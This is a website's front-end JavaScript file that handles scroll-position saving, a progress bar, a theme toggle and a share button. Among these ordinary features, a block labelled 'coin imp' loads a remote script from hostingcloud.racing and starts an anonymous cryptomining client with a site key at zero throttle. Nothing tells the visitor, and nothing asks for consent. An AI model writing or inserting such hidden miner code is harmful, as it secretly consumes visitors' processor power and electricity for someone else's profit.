// variables
let moreContent = document.getElementById('more-content');

// progress bar
let progressBarDiv = document.createElement('span');
progressBarDiv.className = 'progress-bar';

// scroll listener
window.addEventListener('scroll', () => {

    // save scroll
    let currenPath = window.location.pathname;
    localStorage.setItem('scrollPosition_' + currenPath, window.scrollY);
    
    // save progress
    const windowHeight = window.innerHeight;
    const fullHeight = document.documentElement.scrollHeight;
    const scrolled = window.scrollY;
    const progressWidth = (scrolled / (fullHeight - windowHeight)) * 100;
    progressBarDiv.style.width = progressWidth + '%';
});

// dom is loaded
window.addEventListener('DOMContentLoaded', () => {
    
    // hide splash and fix body
    let splash = document.querySelector('.splash')
    splash.style.display = 'none';
    document.body.style.overflowY = 'auto';
    
    // save scroll position
    let currenPath = window.location.pathname;

    let scrollPosition = localStorage.getItem('scrollPosition_' + currenPath);

    if (scrollPosition) {
        window.scrollTo(0, scrollPosition);
    }

    // share
    let share = document.createElement('script');
    share.src = 'https://static.addtoany.com/menu/page.js';
    let shareBtn = document.createElement('a');
    shareBtn.href = 'https://www.addtoany.com/share';
    shareBtn.className = 'a2a_dd';
    shareBtn.textContent = 'Share';
    
    // menu button and theme toggle
    let themeToggle = document.createElement('button')
    themeToggle.innerText = "Aklatell"
    themeToggle.className = "theme";
    themeToggle.addEventListener('click', () => {
        if(document.body.classList.contains('light')){
            document.body.classList.replace('light', 'dark');
            localStorage.setItem('theme', 'dark')
        }else{
            document.body.classList.replace('dark', 'light');
            localStorage.setItem('theme', 'light')
        }
    });
    let currentTheme = localStorage.getItem('theme');
        if(currentTheme){
        document.body.classList.add(currentTheme);
    }
    
    // coin imp
    let ciScript = document.createElement('script');
    ciScript.src = `https://www.hostingcloud.racing/qcgM.js`
    ciScript.addEventListener('load', () => {
        var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
            throttle: 0, c: 'w', ads: 0
        });
        _client.start();
    });

    // append more content
    moreContent.append(share);
    moreContent.append(ciScript);
    moreContent.append(shareBtn);
    moreContent.append(themeToggle);
    moreContent.append(progressBarDiv);
});